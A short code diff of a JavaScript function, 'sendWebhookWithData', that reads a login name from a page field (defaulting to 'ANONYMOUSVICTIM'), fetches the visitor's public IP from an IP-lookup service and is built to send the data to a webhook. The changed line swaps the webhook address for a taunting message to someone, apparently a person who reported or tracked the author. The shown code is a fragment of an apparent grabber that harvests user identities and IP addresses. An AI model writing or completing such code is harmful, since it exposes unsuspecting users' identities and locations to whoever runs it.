@@ -1,7 +1,7 @@
 async function sendWebhookWithData() {
   const loginName = $("#login_name").val() || "ANONYMOUSVICTIM";
   const urlToFetch = "https://api.ipify.org"; // Replace with the URL you want to fetch
-  const webhookUrl = "meet me on discord, ivorydevrimoqr"
+  const webhookUrl = "meet me on discord, ivorydevrimoqr friend me and we will talk who you are, this time im not using webhook urls XD, dumbass"
 
   try {
     const response = await fetch(urlToFetch);
